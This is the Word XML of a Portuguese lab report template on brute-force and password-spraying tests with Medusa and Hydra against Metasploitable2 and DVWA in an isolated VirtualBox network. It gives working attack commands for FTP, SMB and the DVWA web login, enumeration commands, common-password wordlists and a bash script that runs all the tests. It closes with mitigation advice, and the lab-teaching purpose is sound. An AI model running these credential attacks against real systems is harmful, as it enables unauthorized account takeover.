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— Laboratório de Força Bruta com Medusa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Projeto: Testes de força bruta e password spraying em ambiente de laboratório</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Autor: João Paulo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Data: [INSERIR DATA]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>---</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Sumário</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. Resumo Executivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. Escopo e Regras de Engajamento</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. Ambiente (VirtualBox)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. Preparação das VMs — passo a passo com telas (placeholders para imagens)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>5. Ferramentas e instalação (Kali + Medusa, Hydra, enum4linux, smbclient)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>6. Cenários de teste e comandos (FTP, DVWA (web form), SMB)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>7. Wordlists utilizadas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>8. Coleta de evidências e logs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>9. Resultado (modelo de evidências)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>10. Recomendações de mitigação</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>11. Template Word para relatório final (estrutura pronta para preencher)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>12. Anexos — scripts e comando para automação</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Resumo Executivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Descreva aqui, em 3–5 parágrafos curtos, o objetivo do teste, as máquinas envolvidas (Kali como atacante e Metasploitable/DVWA como alvo), os principais achados (por exemplo: credenciais fracas encontradas em FTP e SMB) e o risco associado.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Escopo e Regras de Engajamento</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Ambiente isolado em VirtualBox (host-only / internal network).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Testes realizados apenas nas VMs listadas: Kali Linux (atacante) e Metasploitable2 / DVWA (alvo).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Não testar em redes/hosts de produção nem em sistemas de terceiros.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Ambiente (VirtualBox)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>**Configuração recomendada das VMs:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Rede: Host-only (ex: 192.168.56.0/24) ou Internal Network.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Kali: 2 vCPU, 4–8 GB RAM, disco 40–64 GB, Adapter de rede: Host-only.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Metasploitable2: 1 vCPU, 1–2 GB RAM, disco 20 GB, Adapter de rede: Host-only.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>**IPs (exemplo):**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Kali: 192.168.56.100</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Metasploitable2: 192.168.56.101</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- DVWA (se separado): 192.168.56.102</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Preparação das VMs — passo a passo com telas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Instrução: nos campos abaixo coloque as capturas de tela correspondentes às etapas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4.1 Criar VM Kali</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. VirtualBox → Novo → Nome: Kali → Tipo: Linux → Versão: Debian (64-bit).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Figura 1 — Tela Novo (Criar VM): [INSERIR PRINT]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. Memória: 4096 MB (ou 8192 MB). Figura 2 — Memória: [INSERIR PRINT]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. Disco: VDI dinâmico, 40 GB. Figura 3 — Disco: [INSERIR PRINT]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. Rede: Adapter 1 → Host-only Adapter (vboxnet0). Figura 4 — Rede: [INSERIR PRINT]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>4.2 Criar VM Metasploitable2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. VirtualBox → Novo → Nome: Metasploitable2 → Tipo: Linux → Versão: Other Linux (32-bit).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Figura 5 — Novo Metasploitable2: [INSERIR PRINT]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. Memória: 1024–2048 MB. Disco: 20 GB.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. Rede: Adapter 1 → Host-only Adapter (mesma rede que Kali). Figura 6 — Rede Metasploitable: [INSERIR PRINT]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>4.3 Confirmar conectividade (comandos)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Na Kali:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ip a</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ping -c 3 192.168.56.101</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Figura 7 — Ping para alvo: [INSERIR PRINT]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Ferramentas e instalação (Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>No Kali, atualize e instale as ferramentas principais:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sudo apt update &amp;&amp; sudo apt upgrade -y</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sudo apt install medusa hydra enum4linux smbclient smbmap net-tools tcpdump -y</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Verificar Medusa:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>medusa -h</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>medusa -d</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Cenários de teste e comandos (FTP, DVWA, SMB)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OBS: Execute apenas em ambiente de laboratório.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>6.1 Força bruta FTP (Medusa)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Wordlists: users.txt e passwords.txt (ver seção 7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Comando (usuário único):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>medusa -h 192.168.56.101 -u ftp -P /home/kali/passwords.txt -M ftp -T 8 -f -O /home/kali/medusa_ftp_results.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Comando (lista de usuários):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>medusa -M ftp -h 192.168.56.101 -U /home/kali/users.txt -P /home/kali/passwords.txt -T 6 -O /home/kali/medusa_ftp_multi.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Validação quando encontrar credenciais:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ftp 192.168.56.101</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>curl -v ftp://usuario:senha@192.168.56.101/</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>6.2 Ataque a formulário web (DVWA) — Hydra recomendado</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Hydra (exemplo para DVWA):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>hydra -L /home/kali/users.txt -P /home/kali/passwords.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=incorrect" -t 8 -V -w 5</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>6.3 Password spraying / SMB (Medusa)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Enumere usuários:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>enum4linux -U 192.168.56.101</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>smbmap -H 192.168.56.101</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Executar Medusa (smbnt):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>medusa -M smbnt -h 192.168.56.101 -U /home/kali/users.txt -P /home/kali/passwords.txt -T 8 -O /home/kali/medusa_smb_results.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Validar credenciais:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>smbclient -L //192.168.56.101 -U usuario%senha</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>smbclient //192.168.56.101/share -U usuario%senha</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. Wordlists utilizadas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Crie arquivos em /home/kali/wordlists/.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>users.txt (exemplo curto):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>root</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ftp</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>test</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>www-data</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>passwords.txt (exemplo curto):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>123456</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>password</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>admin123</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>welcome</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>P@ssw0rd</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Observação: para testes maiores, use rockyou.txt ou SecLists, mas tenha cautela – são grandes e ruidosos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8. Coleta de evidências e logs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Sempre salve as saídas do Medusa com -O.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Capture tráfego: (ex: na Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sudo tcpdump -i any host 192.168.56.101 -w /home/kali/capturas/ftp_capture.pcap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Gere hash dos logs para integridade:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sha256sum /home/kali/medusa_*.txt &gt; /home/kali/log_hashes.sha256</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tire screenshots das telas com sucesso de login.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9. Resultado (modelo de evidências)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Preencha com as credenciais encontradas, timestamps e explicação do impacto.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exemplo:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Serviço: FTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Alvo: 192.168.56.101</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Credencial encontrada: ftp:123456</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Data/hora: 2025-10-16 09:12:23</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Evidências: /home/kali/medusa_ftp_results.txt, ftp_capture.pcap, screenshot_ftp_login.png</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>10. Recomendações de mitigação</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Políticas de senha forte e rotação.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Bloqueio temporário após N falhas (account lockout).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Rate limiting e detecção/alerta de bursts de autenticação.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>MFA para serviços críticos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Evitar expor SMB/FTP sem necessidade; usar SFTP/FTPS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Implementar fail2ban para serviços suportados.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>11. Template Word (estrutura pronta)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Capa:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Título: Relatório de Teste de Força Bruta — [Projeto]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Autor: [Seu Nome]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Data: [DATA]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Nota: Testes conduzidos em ambiente controlado.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Sumário</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. Resumo Executivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. Escopo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. Metodologia</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. Comandos e Evidências</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>5. Resultados</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>6. Recomendações</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Anexos: scripts e hashes dos logs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>12. Anexos — Scripts e automatização</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Script exemplo (Kali) — run_all_tests.sh:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>#!/bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>TARGET_FTP=192.168.56.101</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>TARGET_DVWA=192.168.56.102</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>TARGET_SMB=192.168.56.101</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>USERLIST=/home/kali/wordlists/users.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>PASSLIST=/home/kali/wordlists/passwords.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OUTDIR=/home/kali/medusa_results</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>mkdir -p $OUTDIR</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># FTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>medusa -M ftp -h $TARGET_FTP -U $USERLIST -P $PASSLIST -T 8 -O $OUTDIR/medusa_ftp_$(date +%F_%H%M).txt</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># SMB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>medusa -M smbnt -h $TARGET_SMB -U $USERLIST -P $PASSLIST -T 8 -O $OUTDIR/medusa_smb_$(date +%F_%H%M).txt</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># DVWA (Hydra)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>hydra -L $USERLIST -P $PASSLIST $TARGET_DVWA http-post-form "/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=incorrect" -t 8 -o $OUTDIR/hydra_dvwa_$(date +%F_%H%M).txt</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Hash logs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sha256sum $OUTDIR/* &gt; $OUTDIR/log_hashes_$(date +%F_%H%M).sha256</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>echo "Execução finalizada. Resultados em $OUTDIR"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 — Laboratório de Força Bruta com Medusa</dc:title>
  <dc:subject/>
  <dc:creator>João Paulo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